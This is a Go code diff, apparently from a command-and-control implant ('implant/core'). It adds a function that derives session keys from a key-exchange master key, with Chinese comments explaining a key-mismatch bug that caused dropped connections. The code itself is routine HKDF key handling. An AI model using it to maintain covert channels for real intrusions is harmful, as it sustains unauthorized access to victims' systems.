@@ -13,6 +13,7 @@ import (
 
 	"golang.org/x/crypto/hkdf"
 
+	"implant/core/config"
 	"implant/core/debuglog"
 )
 
@@ -239,4 +240,55 @@ func MasterKeyReplaced() bool {
 	masterKeyReplacedMu.RLock()
 	defer masterKeyReplacedMu.RUnlock()
 	return masterKeyReplaced
+}
+
+// SetSessionKeyPreferringKX 按"是否已完成 KX 交换"选择主密钥来源来建立会话密钥。
+//
+// 为什么需要这个函数（这是一个真实踩到的坑）：
+// `SetSessionKey(salt, masterKey)` 会用**参数里的** masterKey 覆盖 globalMasterKey。
+// 而 KX 交换完成后，正确的主密钥是派生值，不是编译期静态值。若 Connect 里
+// 在 kxHandshake 之后仍调用 SetSessionKey(salt, staticMasterKey)，会出现：
+//
+//	客户端会话密钥 = HKDF(静态密钥, …)
+//	服务端会话密钥 = HKDF(派生密钥, …)
+//
+// 两者不同 → 之后所有加解密失败，而现象只是"上线后又掉线"，极难定位。
+//
+// 所以把判断收敛到这里：已完成 KX 就走派生密钥，否则走静态密钥。
+// 调用方不该自己判断 —— 判断点分散就等于迟早漏一处。
+func (ckm *ClientKeyManager) SetSessionKeyPreferringKX(salt, staticMasterKey []byte) error {
+	if MasterKeyReplaced() {
+		return ckm.deriveSessionKeyFromCurrentMaster(salt)
+	}
+	return ckm.SetSessionKey(salt, staticMasterKey)
+}
+
+// deriveSessionKeyFromCurrentMaster 用当前的 globalMasterKey 派生会话密钥
+// （与 SetSessionKey 同公式，只是主密钥来源换成已替换的值）。
+func (ckm *ClientKeyManager) deriveSessionKeyFromCurrentMaster(salt []byte) error {
+	ckm.mu.Lock()
+	defer ckm.mu.Unlock()
+
+	if len(globalMasterKey) < 32 {
+		return errors.New("主密钥未初始化，无法派生会话密钥")
+	}
+	if len(salt) >= 16 {
+		sl := make([]byte, 16)
+		copy(sl, salt[:16])
+		globalSalt = sl
+	}
+	mk := make([]byte, 32)
+	copy(mk, globalMasterKey[:32])
+
+	hk := hkdf.New(sha256.New, mk, salt, []byte(config.SessionKeyInfo()+ckm.clientID))
+	sessionKey := make([]byte, 32)
+	if _, err := io.ReadFull(hk, sessionKey); err != nil {
+		return fmt.Errorf("派生会话密钥失败: %v", err)
+	}
+	ckm.sessionKey = sessionKey
+	ckm.keyVersion++
+	ckm.createdAt = time.Now()
+	ckm.expiresAt = time.Now().Add(24 * time.Hour)
+	debuglog.Printf("🔑 [CLIENT] 会话密钥已用 KX 派生主密钥建立（version=%d）\n", ckm.keyVersion)
+	return nil
 }
